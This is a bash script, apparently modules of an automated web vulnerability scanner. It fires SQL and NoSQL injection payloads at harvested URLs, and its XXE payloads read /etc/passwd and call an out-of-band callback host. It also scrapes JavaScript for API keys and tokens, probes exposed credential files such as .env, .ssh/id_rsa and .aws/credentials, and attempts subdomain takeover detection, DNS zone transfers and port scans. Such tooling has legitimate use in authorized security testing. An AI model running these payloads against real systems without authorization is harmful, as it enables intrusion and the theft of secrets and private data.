#!/bin/bash
# ══════════════════════════════════════════════════════
#  MOD 07: SQLi (FIXED) | XXE (FIXED with OOB)
#  MOD 08: Secrets (FIXED entropy check)
#  MOD 09: Takeover | MOD 10: Recon
# ══════════════════════════════════════════════════════

# ══════════════════════════════════════════════════════
#  MOD 07a: SQL Injection — FIXED (issue #2)
#  Safer flags: level 1, risk 1, technique=BEU only
# ══════════════════════════════════════════════════════
mod_sqli() {
  log_section "MOD 07a: SQL Injection (Safe Mode)"
  local S="$OUTPUT_DIR/vulns/sqli"
  mkdir -p "$S"

  # FIXED #2: safer sqlmap flags — no time-based, no stacked queries
  if cmd_exists sqlmap && [[ -s "$OUTPUT_DIR/urls/gf_sqli.txt" ]]; then
    log_info "sqlmap (level 1, risk 1, BEU only — WAF-safe)..."
    head -20 "$OUTPUT_DIR/urls/gf_sqli.txt" | while read -r url; do
      safe_run sqlmap -u "$url" \
        --batch --random-agent \
        --level 1 --risk 1 \
        --timeout "$TIMEOUT" \
        --output-dir "$S/sqlmap" \
        --smart \
        --technique=BEU \
        -q 2>/dev/null || true
    done
  fi

  # Error-based quick check only (no sleep payloads)
  log_info "Error-based SQLi detection (no time-based)..."
  PAYLOADS=("'" "\"" "1'OR'1'='1" "' OR '1'='1")
  ERR_PATTERNS="sql syntax|mysql_fetch|ORA-[0-9]{4}|pg_query|SQLite|ODBC Driver|Unclosed quotation|Warning.*mysql|syntax error.*SQL|Microsoft OLE DB|mariadb"

  grep '=' "$OUTPUT_DIR/urls/all_urls.txt" 2>/dev/null | \
    grep -v "\.css\|\.js\|\.png\|\.jpg\|\.woff" | \
    head -100 | while read -r url; do
    for p in "${PAYLOADS[@]}"; do
      RESP=$(curl -sk --max-time "$TIMEOUT" "${url}${p}" 2>/dev/null)
      if echo "$RESP" | grep -qiP "$ERR_PATTERNS"; then
        log_finding "SQLi Error-based: $url"
        echo "[HIGH] $url | payload: $p" >> "$S/error_based.txt"
        break
      fi
    done
  done

  # NoSQL injection (manual, safe)
  log_info "NoSQL injection (MongoDB patterns)..."
  NOSQL_PAYLOADS=('{"$gt":""}' '{"$ne":null}' '{"$regex":".*"}')
  grep '?' "$OUTPUT_DIR/urls/all_urls.txt" 2>/dev/null | \
    grep -iE "api|user|auth|login|search" | head -30 | while read -r url; do
    for p in "${NOSQL_PAYLOADS[@]}"; do
      RESP=$(curl -sk --max-time "$TIMEOUT" \
        -H "Content-Type: application/json" \
        -d "$p" "$url" 2>/dev/null)
      echo "$RESP" | grep -qiE '"_id"|"__v"|"nModified"' && \
        log_finding "NoSQLi: $url" && \
        echo "[HIGH] $url | $p" >> "$S/nosql.txt" && break
    done
  done
}

# ══════════════════════════════════════════════════════
#  MOD 07b: XXE — FIXED (issue #3)
#  OOB via interactsh instead of hardcoded attacker.com
# ══════════════════════════════════════════════════════
mod_xxe() {
  log_section "MOD 07b: XXE Injection (OOB via interactsh)"
  local X="$OUTPUT_DIR/vulns/xxe"
  mkdir -p "$X"
  local LIVE="$OUTPUT_DIR/subdomains/live.txt"
  [[ ! -f "$LIVE" ]] && return

  # FIXED #3: use interactsh for OOB callback
  OOB_HOST=""
  if cmd_exists interactsh-client; then
    log_info "Starting interactsh OOB listener..."
    interactsh-client -json -o "$X/interactsh_log.json" &
    INTERACTSH_PID=$!
    sleep 3
    OOB_HOST=$(cat "$X/interactsh_log.json" 2>/dev/null | \
      jq -r '.url' 2>/dev/null | head -1 || echo "")
    log_info "OOB host: $OOB_HOST"
  fi

  # Fallback: use a unique subdomain of interact.sh
  if [[ -z "$OOB_HOST" ]]; then
    RAND=$(head -c8 /dev/urandom | xxd -p)
    OOB_HOST="${RAND}.oast.fun"
    log_warn "interactsh not available, using $OOB_HOST (check DNS logs manually)"
  fi

  # XXE payloads with real OOB host
  XXE_LFI='<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
  XXE_OOB="<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://${OOB_HOST}/xxe\">%xxe;]><root/>"
  XXE_SOAP="<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"http://${OOB_HOST}/soap\">]><soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><x>&xxe;</x></soapenv:Body></soapenv:Envelope>"

  head -10 "$LIVE" | while IFS= read -r url; do
    for endpoint in "/" "/api" "/api/v1" "/api/upload" "/api/xml" "/soap" "/service" "/ws"; do
      TARGET="$url$endpoint"

      # LFI test
      RESP=$(curl -sk --max-time "$TIMEOUT" \
        -X POST -H "Content-Type: application/xml" \
        -d "$XXE_LFI" "$TARGET" 2>/dev/null)
      if echo "$RESP" | grep -qE "root:x:|nobody:|/bin/bash"; then
        log_finding "XXE LFI: $TARGET"
        echo "[CRITICAL] XXE LFI at $TARGET" >> "$X/xxe_lfi.txt"
        echo "Response snippet: $(echo "$RESP" | head -3)" >> "$X/xxe_lfi.txt"
      fi

      # OOB test
      curl -sk --max-time "$TIMEOUT" \
        -X POST -H "Content-Type: application/xml" \
        -d "$XXE_OOB" "$TARGET" 2>/dev/null > /dev/null || true

      # SOAP XXE
      curl -sk --max-time "$TIMEOUT" \
        -X POST \
        -H "Content-Type: text/xml;charset=UTF-8" \
        -H "SOAPAction: test" \
        -d "$XXE_SOAP" "$TARGET" 2>/dev/null > /dev/null || true
    done
  done

  # Check OOB hits
  sleep 5
  if [[ -f "$X/interactsh_log.json" ]]; then
    OOB_HITS=$(grep -c "xxe\|soap" "$X/interactsh_log.json" 2>/dev/null || echo 0)
    [[ "$OOB_HITS" -gt 0 ]] && log_finding "XXE OOB hits detected: $OOB_HITS"
  fi

  [[ -n "${INTERACTSH_PID:-}" ]] && kill "$INTERACTSH_PID" 2>/dev/null || true
  log_info "XXE scan complete!"
}

# ══════════════════════════════════════════════════════
#  MOD 08: Secrets — FIXED (issue #11)
#  Added entropy check to reduce false positives
# ══════════════════════════════════════════════════════
mod_secrets() {
  log_section "MOD 08: Secrets & Sensitive Files (with Entropy Check)"
  local SEC="$OUTPUT_DIR/vulns/secrets"
  mkdir -p "$SEC"
  local LIVE="$OUTPUT_DIR/subdomains/live.txt"
  [[ ! -f "$LIVE" ]] && return

  # FIXED #11: Shannon entropy check function
  # High entropy (>4.0) = likely real secret, not placeholder
  entropy_check() {
    local str="$1"
    python3 - "$str" <<'PY' 2>/dev/null
  import math
  import sys

  s = sys.argv[1]
  if len(s) < 8:
    sys.exit(1)

  freq = {}
  for c in s:
    freq[c] = freq.get(c, 0) + 1

  entropy = -sum((f / len(s)) * math.log2(f / len(s)) for f in freq.values())
  sys.exit(0 if entropy > 3.5 else 1)
PY
  }

  # trufflehog
  log_info "trufflehog deep scan..."
  if cmd_exists trufflehog; then
    safe_run trufflehog filesystem \
      --directory "$OUTPUT_DIR" \
      --json 2>/dev/null > "$SEC/trufflehog.json" || true
    TRUF=$(grep -c "Raw" "$SEC/trufflehog.json" 2>/dev/null || echo 0)
    log_info "trufflehog: $TRUF raw findings"
  fi

  # gitleaks
  log_info "gitleaks..."
  if cmd_exists gitleaks; then
    safe_run gitleaks detect \
      --source "$OUTPUT_DIR" \
      -r "$SEC/gitleaks.json" \
      --no-banner 2>/dev/null || true
  fi

  # FIXED #11: Patterns with entropy validation
  declare -A PATTERNS=(
    ["AWS_ACCESS"]="AKIA[0-9A-Z]{16}"
    ["AWS_SECRET"]="[aA]ws.{0,20}['\"]([A-Za-z0-9/+]{40})['\"]"
    ["GOOGLE_API"]="AIza[0-9A-Za-z\\-_]{35}"
    ["GITHUB_TOKEN"]="ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}"
    ["SLACK_TOKEN"]="xox[baprs]-[0-9A-Za-z\\-]{20,}"
    ["SLACK_WEBHOOK"]="hooks\\.slack\\.com/services/T[a-zA-Z0-9_]+/B[a-zA-Z0-9_]+"
    ["STRIPE_LIVE"]="sk_live_[0-9a-zA-Z]{24}"
    ["FIREBASE"]="AAAA[A-Za-z0-9_-]{7}:[A-Za-z0-9_-]{140}"
    ["SENDGRID"]="SG\\.[a-zA-Z0-9_-]{22}\\.[a-zA-Z0-9_-]{43}"
    ["TWILIO"]="SK[0-9a-fA-F]{32}"
    ["NPM_TOKEN"]="npm_[A-Za-z0-9]{36}"
    ["PRIVATE_KEY"]="-----BEGIN (RSA |EC |OPENSSH |PGP )?PRIVATE KEY"
    ["DB_CONN"]="(mongodb|mysql|postgresql|redis|mssql)(\\+srv)?://[^\\s\"'<]{8,}"
    ["JWT_TOKEN"]="eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+"
  )

  # Scan JS files + URLs with entropy validation
  cat "$OUTPUT_DIR/urls/js_files.txt" 2>/dev/null | head -300 | while read -r jsurl; do
    CONTENT=$(curl -sk --max-time "$TIMEOUT" "$jsurl" 2>/dev/null)
    for name in "${!PATTERNS[@]}"; do
      while IFS= read -r match; do
        [[ -z "$match" ]] && continue
        # Skip obvious placeholders
        echo "$match" | grep -qiE "example|placeholder|your_|<|>|xxx|test123|dummy" && continue
        # Entropy check
        if entropy_check "$match"; then
          log_finding "[SECRET:$name] $jsurl"
          echo "[SECRET:$name] $jsurl | ${match:0:40}..." >> "$SEC/${name}.txt"
        fi
      done < <(echo "$CONTENT" | grep -oP "${PATTERNS[$name]}" 2>/dev/null | head -5)
    done
  done

  # Sensitive file discovery
  log_info "Sensitive file discovery..."
  SENSITIVE=(
    ".env" ".env.local" ".env.production" ".env.development" ".env.backup"
    ".git/config" ".git/HEAD" ".htaccess" ".htpasswd"
    "web.config" "wp-config.php" "config.php" "database.php"
    "phpinfo.php" "backup.zip" "backup.sql" "db.sql" "dump.sql"
    "swagger.json" "openapi.json" "api-docs.json"
    "package.json" "composer.json" "requirements.txt"
    "Dockerfile" "docker-compose.yml"
    ".bash_history" ".ssh/id_rsa"
    "adminer.php" ".aws/credentials"
    "error.log" "access.log" "debug.log"
    "actuator/env" "actuator/dump" "actuator/mappings"
  )

  head -20 "$LIVE" | while IFS= read -r url; do
    for file in "${SENSITIVE[@]}"; do
      FULL="$url/$file"
      STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        --max-time "$TIMEOUT" "$FULL" 2>/dev/null)
      if [[ "$STATUS" == "200" ]]; then
        CONTENT=$(curl -sk --max-time "$TIMEOUT" "$FULL" 2>/dev/null | head -20)
        SIZE=${#CONTENT}
        [[ "$SIZE" -lt 10 ]] && continue
        echo "$CONTENT" | grep -qi "404\|not found\|error 404" && continue
        SEV="medium"
        echo "$CONTENT" | grep -qiE "password|secret|key|token|database|private" && SEV="critical"
        log_finding "[$SEV] $FULL"
        echo "[$SEV] $FULL" >> "$SEC/sensitive_files.txt"
      fi
    done
  done

  # Git exposure
  log_info "Git repo exposure..."
  head -20 "$LIVE" | while IFS= read -r url; do
    GIT=$(curl -sk --max-time "$TIMEOUT" "$url/.git/HEAD" 2>/dev/null)
    echo "$GIT" | grep -q "ref:" && \
      log_finding "GIT EXPOSED: $url" && \
      echo "[CRITICAL] $url/.git/" >> "$SEC/git_exposed.txt" || true
  done

  log_info "Secrets scan complete!"
}

# ══════════════════════════════════════════════════════
#  MOD 09: Subdomain Takeover
# ══════════════════════════════════════════════════════
mod_takeover() {
  log_section "MOD 09: Subdomain Takeover"
  local T="$OUTPUT_DIR/takeover"
  mkdir -p "$T"
  local SUBS="$OUTPUT_DIR/subdomains/all_subdomains.txt"
  [[ ! -f "$SUBS" ]] && return

  cmd_exists subjack && \
    safe_run subjack -w "$SUBS" -t "$THREADS" -timeout "$TIMEOUT" \
      -ssl -c /tmp/subjack_fingerprints.json \
      -o "$T/subjack.txt" || true

  cmd_exists subzy && \
    safe_run subzy run --targets "$SUBS" \
      --output "$T/subzy.txt" --hide-fails || true

  VULN_SVCS=("github.io" "heroku.com" "amazonaws.com" "cloudfront.net"
    "azurewebsites.net" "ghost.io" "netlify.app" "surge.sh"
    "wordpress.com" "zendesk.com" "statuspage.io" "fastly.net"
    "shopify.com" "pantheon.io" "readthedocs.io" "webflow.io")

  while IFS= read -r sub; do
    CNAME=$(dig +short CNAME "$sub" 2>/dev/null | tail -1)
    [[ -z "$CNAME" ]] && continue
    RESOLVED=$(dig +short A "$CNAME" 2>/dev/null | head -1)
    if [[ -z "$RESOLVED" ]]; then
      for svc in "${VULN_SVCS[@]}"; do
        echo "$CNAME" | grep -qi "$svc" && \
          log_finding "TAKEOVER: $sub → $CNAME [$svc]" && \
          echo "[CRITICAL] $sub → $CNAME | $svc" >> "$T/dangling.txt"
      done
    fi
  done < "$SUBS" 2>/dev/null || true

  cat "$T/"*.txt 2>/dev/null | sort -u > "$T/all.txt"
  log_info "Takeover candidates: $(wc -l < "$T/all.txt" 2>/dev/null || echo 0)"
}

# ══════════════════════════════════════════════════════
#  MOD 10: Recon
# ══════════════════════════════════════════════════════
mod_recon() {
  log_section "MOD 10: DNS & Infrastructure Recon"
  local R="$OUTPUT_DIR/recon"
  mkdir -p "$R"

  safe_run whois "$DOMAIN" > "$R/whois.txt"

  for rec in A AAAA CNAME MX NS TXT SOA CAA SRV; do
    echo "── $rec ──" >> "$R/dns.txt"
    dig +short "$rec" "$DOMAIN" >> "$R/dns.txt" 2>/dev/null || true
  done
  echo "── DMARC ──" >> "$R/dns.txt"
  dig +short TXT "_dmarc.$DOMAIN" >> "$R/dns.txt" 2>/dev/null || true

  SPF=$(dig +short TXT "$DOMAIN" 2>/dev/null | grep -i "v=spf" | head -1 || echo "NOT SET")
  DMARC_VAL=$(dig +short TXT "_dmarc.$DOMAIN" 2>/dev/null | head -1 || echo "NOT SET")
  [[ "$SPF" == "NOT SET" ]] && log_finding "SPF missing: $DOMAIN"
  [[ "$DMARC_VAL" == "NOT SET" ]] && log_finding "DMARC missing: $DOMAIN"

  dig axfr "$DOMAIN" @"$(dig +short NS "$DOMAIN" 2>/dev/null | head -1)" \
    2>/dev/null > "$R/zone_transfer.txt" || true

  cmd_exists naabu && \
    safe_run naabu -l "$OUTPUT_DIR/subdomains/all_subdomains.txt" \
      -p "21,22,23,25,53,80,110,143,443,445,3000,3306,3389,4443,5432,5900,6379,8080,8443,9200,27017" \
      -silent -c "$THREADS" -o "$R/ports.txt" || true

  IP=$(dig +short A "$DOMAIN" 2>/dev/null | head -1)
  [[ -n "$IP" ]] && \
    curl -s "https://ipinfo.io/$IP/json" 2>/dev/null > "$R/ipinfo.json" || true
}
